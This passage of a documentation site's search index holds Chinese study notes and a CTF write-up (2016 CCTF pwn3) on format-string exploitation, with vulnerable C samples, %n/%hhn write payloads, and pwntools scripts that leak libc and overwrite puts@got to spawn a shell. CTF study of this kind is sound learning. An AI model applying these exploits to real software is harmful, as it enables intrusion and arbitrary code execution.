\u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002 \u8fdb\u884c\u8986\u76d6 \u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"fmtstr/fmtstr_exploit/#_1","text":"\u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"fmtstr/fmtstr_exploit/#_2","text":"\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002","title":"\u6cc4\u9732\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_3","text":"\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001.22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\"","title":"\u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_4","text":"\u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n$p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002","title":"\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_5","text":"","title":"\u5c0f\u603b\u7ed3"},{"location":"fmtstr/fmtstr_exploit/#_6","text":"\u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002","title":"\u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48"},{"location":"fmtstr/fmtstr_exploit/#_7","text":"\u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order$x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order$s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002","title":"\u5173\u952e\u5b57\u9009\u62e9"},{"location":"fmtstr/fmtstr_exploit/#_8","text":"\u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", &c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; }","title":"\u8986\u76d6\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_9","text":"","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740"},{"location":"fmtstr/fmtstr_exploit/#_10","text":"\u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002","title":"\u8986\u76d6\u5c0f\u6570\u5b57"},{"location":"fmtstr/fmtstr_exploit/#_11","text":"\u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len(\"aa%k$n\")%4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number.","title":"\u600e\u4e48\u5bf9\u9f50"},{"location":"fmtstr/fmtstr_exploit/#_12","text":"\u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 \u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload=\"%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002","title":"\u8986\u76d6\u5927\u6570\u5b57"},{"location":"fmtstr/fmtstr_exploit/#c","text":"\u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3)","title":"\u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570"},{"location":"fmtstr/fmtstr_exploit/#_13","text":"","title":"\u8986\u76d6\u6808\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_14","text":"\u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002","title":"\u786e\u5b9a\u8986\u76d6\u5730\u5740"},{"location":"fmtstr/fmtstr_exploit/#_15","text":"\u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002","title":"\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"},{"location":"fmtstr/fmtstr_exploit/#_16","text":"\u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u8fdb\u884c\u8986\u76d6"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/","text":"2016 CCTF pwn3 \u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u6f0f\u6d1e\u51fd\u6570 \u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } \u601d\u8def \u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u7ed5\u8fc7\u5bc6\u7801 \u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i]; \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a \u6cc4\u9732 libc \u5730\u5740 content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) \u4fee\u6539 got \u8868 \u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"2016 CCTF pwn3 writeup"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#2016-cctf-pwn3","text":"\u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806","title":"2016 CCTF pwn3"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#_1","text":"","title":"\u5206\u6790"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#_2","text":"32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#_3","text":"\u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // 